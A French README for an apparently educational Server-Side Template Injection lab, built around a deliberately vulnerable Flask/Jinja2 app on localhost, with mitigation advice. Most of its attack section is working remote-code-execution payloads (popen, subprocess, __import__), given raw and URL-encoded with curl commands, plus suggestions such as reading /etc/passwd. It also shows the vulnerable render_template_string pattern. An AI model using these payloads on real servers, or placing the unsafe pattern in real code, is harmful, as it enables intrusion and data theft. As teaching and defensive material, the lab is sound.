# Server-Side Template Injection (SSTI) - Démonstration

## Description

Ce projet démontre la vulnérabilité **Server-Side Template Injection (SSTI)** dans une application Flask utilisant Jinja2. Il comprend une application vulnérable et un script d'exploitation automatisé qui identifie et exploite cette faille de sécurité.

## Structure du Projet

```
.
├── main.py              # Application Flask vulnérable
├── exploitation.py      # Script d'exploitation automatisé
├── templates/
│   └── safe_template.html
└── requirements.txt
```

## Installation

```bash
pip install -r requirements.txt
```

## Démarrage de l'Application Vulnérable

```bash
python3 main.py
```

L'application démarre sur `http://127.0.0.1:5000`

## Routes Disponibles

### Route Sécurisée
```
http://127.0.0.1:5000/safe?name=Alice
```
Utilise le moteur de template Jinja2 de manière sécurisée avec un contexte isolé.

### Route Vulnérable
```
http://127.0.0.1:5000/unsafe?name=Alice
```
Vulnérable à SSTI : l'input utilisateur est directement injecté dans le template.

## Payloads de Détection

### 1. Test de Base - Multiplication de Chaîne
**Payload:**
```
{{7*'7'}}
```

**URL:**
```
http://127.0.0.1:5000/unsafe?name={{7*%277%27}}
```

**Résultat:**
```html
Hello, 7777777!
```
Ce test confirme que le moteur de template évalue les expressions Python.

### 2. Accès à la Configuration
**Payload:**
```
{{config}}
```

**URL:**
```
http://127.0.0.1:5000/unsafe?name={{config}}
```

**Résultat:**
```html
Hello, <Config {'DEBUG': True, 'TESTING': False, ...}>!
```
Révèle la configuration de l'application Flask, y compris potentiellement des secrets.

### 3. Introspection des Classes
**Payload:**
```
{{ ''.__class__ }}
```

**URL:**
```
http://127.0.0.1:5000/unsafe?name={{%20%27%27.__class__%20}}
```

**Résultat:**
```html
Hello, <class 'str'>!
```

### 4. Accès à la Hiérarchie des Classes (MRO)
**Payload:**
```
{{ ''.__class__.__mro__ }}
```

**URL:**
```
http://127.0.0.1:5000/unsafe?name={{%20%27%27.__class__.__mro__%20}}
```

**Résultat:**
```html
Hello, (<class 'str'>, <class 'object'>)!
```

### 5. Énumération des Subclasses
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**URL:**
```
http://127.0.0.1:5000/unsafe?name={{%20%27%27.__class__.__mro__[1].__subclasses__%28%29%20}}
```

**Résultat:**
Liste de 499 classes Python disponibles, incluant des classes exploitables.

## Exploitation - Remote Code Execution (RCE)

### Script d'Exploitation Automatisé

Le script `exploitation.py` automatise la détection et l'exploitation de la vulnérabilité SSTI.

**Exécution:**
```bash
python3 exploitation.py
```

### Résultats de l'Exploitation

```
======================================================================
 SSTI Exploitable Class Finder
 Recherche de classes exploitables pour Jinja2 SSTI
======================================================================
[*] Envoi du payload pour récupérer les subclasses...
[*] Parsing du contenu HTML...
[+] 499 classes trouvées

[*] Recherche des classes exploitables...
======================================================================
[+] TROUVÉ: _frozen_importlib_external.FileLoader              Index: 99
[+] TROUVÉ: os._wrap_close                                     Index: 133
[+] TROUVÉ: warnings.catch_warnings                            Index: 225
[+] TROUVÉ: subprocess.Popen                                   Index: 404
```

### Classes Exploitables Identifiées

| Classe | Index | Méthode d'Exploitation |
|--------|-------|------------------------|
| `_frozen_importlib_external.FileLoader` | 99 | Lecture de fichiers |
| `os._wrap_close` | 133 | Exécution de commandes OS |
| `warnings.catch_warnings` | 225 | Accès à `__builtins__` |
| `subprocess.Popen` | 404 | Exécution de processus |

## Payloads RCE Générés

### Méthode 1 : os._wrap_close (Index 133)

#### Via popen
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('whoami').read() }}
```

**URL Encodée:**
```
http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B133%5D.__init__.__globals__%5B%27popen%27%5D%28%27whoami%27%29.read%28%29%20%7D%7D
```

**Test curl:**
```bash
curl "http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B133%5D.__init__.__globals__%5B%27popen%27%5D%28%27whoami%27%29.read%28%29%20%7D%7D"
```

**Résultat:**
```
[+] Résultat: cchopin
[+] RCE CONFIRMÉ avec os._wrap_close! ✓
```

#### Via system
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['system']('whoami') }}
```

**Note:** Affiche le résultat sur stdout mais retourne uniquement le code de sortie.

### Méthode 2 : subprocess.Popen (Index 404)

#### Utilisation Directe avec Liste d'Arguments
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[404](['whoami'], stdout=-1).communicate()[0].decode() }}
```

**URL Encodée:**
```
http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B404%5D%28%5B%27whoami%27%5D%2C%20stdout%3D-1%29.communicate%28%29%5B0%5D.decode%28%29%20%7D%7D
```

#### Via __import__ et os.popen
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[404].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
```

**URL Encodée:**
```
http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B404%5D.__init__.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29.popen%28%27whoami%27%29.read%28%29%20%7D%7D
```

#### Via subprocess.check_output
**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[404].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}
```

**URL Encodée:**
```
http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B404%5D.__init__.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27subprocess%27%29.check_output%28%27whoami%27%2C%20shell%3DTrue%29.decode%28%29%20%7D%7D
```

### Méthode 3 : warnings.catch_warnings (Index 225)

**Payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[225]()._module.__builtins__['__import__']('os').popen('whoami').read() }}
```

**URL Encodée:**
```
http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B225%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27whoami%27%29.read%28%29%20%7D%7D
```

## Résultats des Tests RCE

Le script d'exploitation confirme l'exécution de code :

```
======================================================================
[*] Test d'exécution de code (RCE)
======================================================================

[TEST 1] os._wrap_close (index 133) - Via popen
[+] Résultat: cchopin
[+] RCE CONFIRMÉ avec os._wrap_close! ✓

======================================================================
[*] Analyse terminée
======================================================================
```

## Chaîne d'Exploitation Complète

1. **Détection de la vulnérabilité:** Test avec `{{7*'7'}}` → Confirmation SSTI
2. **Énumération des classes:** Récupération des 499 subclasses Python
3. **Identification des classes exploitables:** 4 classes identifiées
4. **Génération de payloads RCE:** Création automatique de payloads
5. **Exécution de commandes:** Succès avec `os._wrap_close`

## Commandes Système Testables

Remplacez `whoami` dans les payloads ci-dessus par :

- `id` - Informations utilisateur
- `pwd` - Répertoire courant
- `ls -la` - Liste des fichiers
- `cat /etc/passwd` - Lecture de fichiers sensibles
- `uname -a` - Informations système

**Exemple:**
```bash
curl "http://127.0.0.1:5000/unsafe?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B133%5D.__init__.__globals__%5B%27popen%27%5D%28%27ls%20-la%27%29.read%28%29%20%7D%7D"
```

## Protections et Mitigation

### Ne JAMAIS faire :
```python
template_string = f"<h2>Hello, {name}!</h2>"
return render_template_string(template_string)
```

### À faire TOUJOURS :
```python
return render_template('safe_template.html', user_name=name)
```

### Mesures de Protection

1. **Isolation du contexte:** Ne jamais injecter directement l'input utilisateur dans les templates
2. **Sandboxing:** Utiliser un environnement Jinja2 avec restrictions
3. **Validation stricte:** Whitelist des caractères autorisés
4. **WAF:** Détecter les patterns SSTI (`{{`, `{%`, etc.)
5. **Principe du moindre privilège:** Limiter les droits de l'application

## Contexte Pédagogique

Ce projet est destiné **uniquement à des fins éducatives** pour comprendre :
- Les mécanismes des vulnérabilités SSTI
- Les techniques d'exploitation
- Les bonnes pratiques de sécurisation


## Références

- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)


